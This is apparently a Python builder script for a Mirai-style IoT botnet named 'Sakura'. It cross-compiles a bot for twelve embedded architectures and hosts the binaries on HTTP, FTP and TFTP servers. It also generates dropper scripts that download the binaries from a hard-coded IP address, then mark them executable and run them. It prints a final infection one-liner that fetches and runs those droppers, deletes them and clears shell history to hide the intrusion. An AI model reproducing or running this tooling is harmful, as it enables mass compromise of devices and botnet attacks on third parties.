import os
from os import system as run
from time import sleep

os.system("clear")
print("""
Sakura Bot Builder | Updated for Ubuntu
---------------------------------------
""")

# Your bot source file
bot = "Sakura_Bot.c"

# Target architectures
compileas = ["m-i.p-s.Sakura", "m-p.s-l.Sakura", "s-h.4-.Sakura", "x-8.6-.Sakura", "a-r.m-6.Sakura",
             "x-3.2-.Sakura", "a-r.m-7.Sakura", "p-p.c-.Sakura", "i-5.8-6.Sakura", "m-6.8-k.Sakura", "a-r.m-4.Sakura", "a-r.m-5.Sakura"]

archs = ["mips", "mipsel", "sh4", "x86_64", "armv6l",
         "i686", "armv7l", "powerpc", "i586", "m68k", "armv4l", "armv5l"]

# Download and setup compilers
print("\n[+] Installing required packages...")
run("apt update && apt install -y apache2 xinetd tftpd-hpa vsftpd build-essential wget unzip gcc")

# Start services
run("systemctl start apache2")
run("systemctl start xinetd")
run("systemctl start vsftpd")
run("systemctl start tftpd-hpa")

# Prepare directories
print("[+] Creating hosting directories...")
run("mkdir -p /var/www/html /var/ftp /var/lib/tftpboot")

# Download compilers if not already downloaded
if not os.path.exists("cross-compiler.zip"):
    print("[+] Downloading cross compilers...")
    run("wget -q http://d-i.se/cross-compiler.zip && unzip -qq cross-compiler.zip")

# Compile for each arch
print("[+] Compiling for multiple architectures...")
for num, arch in enumerate(archs):
    cc = arch
    output_file = compileas[num]
    compiler_path = f"./cross-compiler/{cc}/bin/{cc}-gcc"
    if os.path.isfile(compiler_path):
        compile_cmd = f"{compiler_path} -static -pthread -D{arch.upper()} -o {output_file} {bot}"
        print(f"Compiling for {arch}...")
        run(compile_cmd)
    else:
        print(f"[!] Compiler for {arch} not found. Skipping...")

# Copy binaries to all servers
print("[+] Deploying binaries to HTTP, FTP, and TFTP directories...")
for binary in compileas:
    if os.path.exists(binary):
        run(f"cp {binary} /var/www/html/")
        run(f"cp {binary} /var/ftp/")
        run(f"cp {binary} /var/lib/tftpboot/")
    else:
        print(f"[!] {binary} not found. Skipping...")

# Create downloader scripts
print("[+] Creating payload scripts...")
http_payload = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;\n"
for binary in compileas:
    http_payload += f"wget http://196.74.117.31:8080/{binary} -O Sakura; chmod +x Sakura; ./Sakura;\n"

tftp_payload = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;\n"
for binary in compileas:
    tftp_payload += f"tftp -g 196.74.117.31 -r {binary}; chmod +x {binary}; ./{binary};\n"

ftp_payload = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;\n"
for binary in compileas:
    ftp_payload += f"ftpget -v -u anonymous -p anonymous 196.74.117.31 {binary} {binary}; chmod +x {binary}; ./{binary};\n"

# Write script files
with open("/var/www/html/Sakura.sh", "w") as f: f.write(http_payload)
with open("/var/lib/tftpboot/tftp1.sh", "w") as f: f.write(tftp_payload)
with open("/var/ftp/ftp1.sh", "w") as f: f.write(ftp_payload)

# Generate final payload
print("\n[+] Final payload (replace YOUR_SERVER_IP with your VPS IP):\n")
print("Payload:")
print("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; "
      "wget http://196.74.117.31:8080/Sakura.sh; chmod 777 Sakura.sh; sh Sakura.sh; "
      "tftp -g 196.74.117.31 -r tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; "
      "rm -rf *.sh; history -c")

print("\n[+] Done!")